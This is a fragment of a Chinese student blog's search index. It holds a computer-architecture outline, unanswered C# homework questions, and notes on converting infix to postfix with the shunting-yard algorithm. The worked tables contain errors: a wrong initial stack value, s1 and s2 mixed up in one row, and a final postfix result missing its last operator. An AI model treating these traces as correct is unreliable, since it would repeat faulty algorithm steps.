        <content type="html"><![CDATA[<h1 id="计算机系统结构"><a href="#计算机系统结构" class="headerlink" title="计算机系统结构"></a>计算机系统结构</h1><h2 id="指令集架构"><a href="#指令集架构" class="headerlink" title="指令集架构"></a>指令集架构</h2><h2 id="微体系架构"><a href="#微体系架构" class="headerlink" title="微体系架构"></a>微体系架构</h2><h2 id="数据表达"><a href="#数据表达" class="headerlink" title="数据表达"></a>数据表达</h2><h2 id="寻址方式"><a href="#寻址方式" class="headerlink" title="寻址方式"></a>寻址方式</h2><h2 id="寄存器定义"><a href="#寄存器定义" class="headerlink" title="寄存器定义"></a>寄存器定义</h2><h2 id="指令系统"><a href="#指令系统" class="headerlink" title="指令系统"></a>指令系统</h2><p>​<img src="C:\Users\czh\AppData\Roaming\Typora\typora-user-images\image-20241106160537615.png" alt="image-20241106160537615"></p><p>​<img src="C:\Users\czh\AppData\Roaming\Typora\typora-user-images\image-20241106160557265.png" alt="image-20241106160557265"></p><p>​<img src="C:\Users\czh\AppData\Roaming\Typora\typora-user-images\image-20241106160618550.png" alt="image-20241106160618550"></p><h2 id="异常机制"><a href="#异常机制" class="headerlink" title="异常机制"></a>异常机制</h2><h2 id="机器工作状态"><a href="#机器工作状态" class="headerlink" title="机器工作状态"></a>机器工作状态</h2><h2 id="输入输出结构"><a href="#输入输出结构" class="headerlink" title="输入输出结构"></a>输入输出结构</h2>]]></content>
      
      
      <categories>
          
          <category> 计算机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机组成与系统结构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C艹基础（1）</title>
      <link href="/2024/11/05/C-%E5%9F%BA%E7%A1%80/"/>
      <url>/2024/11/05/C-%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h1 id="信息系统开发（-NET）-第八章作业"><a href="#信息系统开发（-NET）-第八章作业" class="headerlink" title="信息系统开发（.NET）   第八章作业"></a>信息系统开发（.NET）   第八章作业</h1><h2 id="什么是类的继承？怎么定义派生类？"><a href="#什么是类的继承？怎么定义派生类？" class="headerlink" title="什么是类的继承？怎么定义派生类？"></a>什么是类的继承？怎么定义派生类？</h2><h2 id="简述创建派生类时，构造函数的调用。"><a href="#简述创建派生类时，构造函数的调用。" class="headerlink" title="简述创建派生类时，构造函数的调用。"></a>简述创建派生类时，构造函数的调用。</h2><h2 id="怎样定义基类虚方法，并在派生类中重写基类虚方法？"><a href="#怎样定义基类虚方法，并在派生类中重写基类虚方法？" class="headerlink" title="怎样定义基类虚方法，并在派生类中重写基类虚方法？"></a>怎样定义基类虚方法，并在派生类中重写基类虚方法？</h2><h2 id="抽象方法和虚方法有什么异同？"><a href="#抽象方法和虚方法有什么异同？" class="headerlink" title="抽象方法和虚方法有什么异同？"></a>抽象方法和虚方法有什么异同？</h2><h2 id="什么是抽象类？它有什么特点？它和接口有何异同？"><a href="#什么是抽象类？它有什么特点？它和接口有何异同？" class="headerlink" title="什么是抽象类？它有什么特点？它和接口有何异同？"></a>什么是抽象类？它有什么特点？它和接口有何异同？</h2><h2 id="简述通过委托来调用对象方法的基本过程。"><a href="#简述通过委托来调用对象方法的基本过程。" class="headerlink" title="简述通过委托来调用对象方法的基本过程。"></a>简述通过委托来调用对象方法的基本过程。</h2>]]></content>
      
      
      <categories>
          
          <category> 计算机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> c# </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算器原理</title>
      <link href="/2024/11/05/c-%E5%AE%9E%E7%8E%B0%E8%AE%A1%E7%AE%97%E5%99%A8/"/>
      <url>/2024/11/05/c-%E5%AE%9E%E7%8E%B0%E8%AE%A1%E7%AE%97%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="计算器原理"><a href="#计算器原理" class="headerlink" title="计算器原理"></a>计算器原理</h1><p>计算器计算的表达式是后缀表达式。</p><p>我们输入一个表达式，计算器给出结果主要经过了：将中缀表达式转化为后缀表达式，计算后缀表达式这两个过程</p><p>而转化和计算过程运用到了数据结构“栈”。</p><p>我们为了简化过程，在转化后缀表达式过程中进行中间结果的计算。</p><h3 id="中缀表达式"><a href="#中缀表达式" class="headerlink" title="中缀表达式"></a>中缀表达式</h3><blockquote><p><a href="https://zh.wikipedia.org/wiki/%E4%B8%AD%E7%BC%80%E8%A1%A8%E7%A4%BA%E6%B3%95">中缀表示法 - 维基百科，自由的百科全书</a></p></blockquote><p>中缀表达法是自然语言的写法，其操作符在操作数的中间</p><p>如3+4</p><h3 id="后缀表达式（逆波兰表示法）"><a href="#后缀表达式（逆波兰表示法）" class="headerlink" title="后缀表达式（逆波兰表示法）"></a>后缀表达式（逆波兰表示法）</h3><blockquote><p><a href="https://zh.wikipedia.org/wiki/%E9%80%86%E6%B3%A2%E5%85%B0%E8%A1%A8%E7%A4%BA%E6%B3%95">逆波兰表示法 - 维基百科，自由的百科全书</a></p></blockquote><p>即所有操作符在操作数的后面。</p><h5 id="求值过程"><a href="#求值过程" class="headerlink" title="求值过程"></a>求值过程</h5><ol><li>从左到右扫描表达式</li><li>遇到数字时，将数字压入堆栈</li><li>遇到运算符时<ul><li>弹出栈顶的两个数（栈顶和次顶），用运算符对它们做对应的计算，并将结果入栈</li><li>计算顺序是： 后弹出来的  （运算符）  先弹出来的</li></ul></li></ol><h3 id="调度场算法"><a href="#调度场算法" class="headerlink" title="调度场算法"></a>调度场算法</h3><blockquote><p><a href="https://zh.wikipedia.org/wiki/%E8%B0%83%E5%BA%A6%E5%9C%BA%E7%AE%97%E6%B3%95">调度场算法 - 维基百科，自由的百科全书</a></p></blockquote><p>将中缀表达式转化为后缀表达式的算法。</p><p>为了方便快速计算，我们使用两个栈：运算符栈s1和操作数栈s2。操作数栈其实也可以看作中间结果栈。</p><p>在操作数压栈过程中，直接入栈即可。</p><p>在运算符压栈过程中，需要保持栈顶运算符为当前优先级最高的。换言之就是比当前栈内运算符优先级高的运算符已经完成了运算操作。</p><img src="https://img2020.cnblogs.com/blog/2368409/202112/2368409-20211208192029096-52314956.png" alt="img" style="zoom:67%;" /><h5 id="详细步骤："><a href="#详细步骤：" class="headerlink" title="详细步骤："></a>详细步骤：</h5><ol><li><p>初始化两个栈：</p><ul><li>运算符栈：s1</li><li>中间结果栈：s2</li></ul></li><li><p>从左到右扫描中缀表达式</p></li><li><p>遇到操作数时，将其压入s2</p></li><li><p>遇到运算符时</p><ul><li>比较它和s1栈顶运算符的优先级：<ul><li>如果s1为空或者栈顶运算符符号为（，则将其压入符号栈s1</li><li>如果优先级比栈顶运算符高，也将其压入符号栈s1</li><li>如果优先级比栈顶运算符低或相等，将s1栈顶的运算符弹出，并压入到s2中。</li></ul></li><li>再重复比较它和新栈顶运算符的优先级。</li></ul><blockquote><p>[!NOTE]</p><p>重复的含义：</p><ol><li><p>如果s1栈顶元素符号优先级比当前符号高或者等于，那么就将其弹出压入s2中（循环做，只要s1不为空）。</p><p>如果栈顶符号为 （ ，其优先级最低，就不会弹出，就跳出循环了。</p></li><li><p>跳出循环后，则将当前符号压入s1</p></li></ol></blockquote></li><li><p>遇到括号时：</p><ul><li>如果是左括号（ ：则直接压入s1</li><li>如果是右括号  ）：则以此弹出s1栈顶的运算符，并压入s2，知道遇到左括号为止，此时将这一对括号丢弃。</li></ul></li><li><p>重复步骤2~5，直到表达式最右端。</p></li><li><p>将s1中的运算符以此弹出并压入 s2。</p></li><li><p>以此弹出 s2 中的元素并输出，结果的 逆序 即为：中缀表达式转为后缀表达式。</p></li></ol><h5 id="举例："><a href="#举例：" class="headerlink" title="举例："></a>举例：</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1+((2+3)*4)-5</span><br></pre></td></tr></table></figure><table><thead><tr><th align="center">扫描到的元素</th><th align="center">s2(栈底-&gt;栈顶)</th><th align="center">s1(栈底-&gt;栈顶)</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">4</td><td align="center">空</td><td align="center">遇到操作数，压入s2</td></tr><tr><td align="center">+</td><td align="center">1</td><td align="center">+</td><td align="center">s1栈为空，压入s1</td></tr><tr><td align="center">（</td><td align="center">1</td><td align="center">+（</td><td align="center">左括号，压入s1</td></tr><tr><td align="center">（</td><td align="center">1</td><td align="center">+（（</td><td align="center">左括号，压入s1</td></tr><tr><td align="center">2</td><td align="center">1 2</td><td align="center">+（（</td><td align="center">遇到操作数，压入s2</td></tr><tr><td align="center">+</td><td align="center">1 2</td><td align="center">+（（+</td><td align="center">栈顶为（，压入s2</td></tr><tr><td align="center">3</td><td align="center">1 2 3</td><td align="center">+（（+</td><td align="center">遇到操作数，压入s2</td></tr><tr><td align="center">）</td><td align="center">1 2 3 +</td><td align="center">+（</td><td align="center">遇到右括号，弹出+后遇到左括号，删除一对小括号</td></tr><tr><td align="center">*</td><td align="center">1 2 3 +</td><td align="center">+（*</td><td align="center">遇到操作符，压入s1</td></tr><tr><td align="center">4</td><td align="center">1 2 3 + 4</td><td align="center">+（*</td><td align="center">遇到操作数，压入s2</td></tr><tr><td align="center">）</td><td align="center">1 2 3 + 4 *</td><td align="center">+</td><td align="center">遇到右括号，弹出*后遇到左括号，删除一对小括号</td></tr><tr><td align="center">-</td><td align="center">1 2 3 + 4 * +</td><td align="center">-</td><td align="center">遇到操作符，优先级相等，弹出+后s1为空，此时将-压入 s1</td></tr><tr><td align="center">5</td><td align="center">1 2 3 + 4 * + 5</td><td align="center">-</td><td align="center">遇到操作数，压入s2</td></tr><tr><td align="center">null</td><td align="center">1 2 3 + 4 * + 5 -</td><td align="center">空</td><td align="center">解析完毕，弹出s1中符号并压入s2中</td></tr></tbody></table><p>结果：1 2 3 + 4 * + 5</p><p>这是理论上转化后缀码的步骤。</p><p>优化后的程序为</p><table><thead><tr><th align="center">扫描到的元素</th><th align="center">s2(栈底-&gt;栈顶)</th><th align="center">s1（栈底-&gt;栈顶）</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">4</td><td align="center">空</td><td align="center"></td></tr><tr><td align="center">+</td><td align="center">1</td><td align="center">+</td><td align="center"></td></tr><tr><td align="center">（</td><td align="center">1</td><td align="center">+（（</td><td align="center"></td></tr><tr><td align="center">2</td><td align="center">1 2</td><td align="center">+（（</td><td align="center"></td></tr><tr><td align="center">+</td><td align="center">1 2</td><td align="center">+（（+</td><td align="center"></td></tr><tr><td align="center">3</td><td align="center">1 2 3</td><td align="center">+（（+</td><td align="center"></td></tr><tr><td align="center">）</td><td align="center">1 5</td><td align="center">+（</td><td align="center">将+压入s1，消除小括号，s2计算3 + 2</td></tr><tr><td align="center">*</td><td align="center">1 5</td><td align="center">+（*</td><td align="center"></td></tr><tr><td align="center">4</td><td align="center">1 5 4</td><td align="center">+（*</td><td align="center"></td></tr><tr><td align="center">）</td><td align="center">1 20</td><td align="center">+</td><td align="center">将*压入s1，消除小括号，是、s2计算 4 * 5</td></tr><tr><td align="center">-</td><td align="center">21</td><td align="center">-</td><td align="center">将+压入s2，计算20+1</td></tr><tr><td align="center">5</td><td align="center">21 5</td><td align="center">-</td><td align="center"></td></tr><tr><td align="center">null</td><td align="center">16</td><td align="center"></td><td align="center">将s1弹栈，压入s2</td></tr></tbody></table><p>结果为16</p><p>这个讲数据结构的笔记挺好的： <a href="https://zq99299.github.io/dsalg-tutorial/">数据结构与算法 系列教程（笔记）</a></p>]]></content>
      
      
      <categories>
          
          <category> 计算机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据结构 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
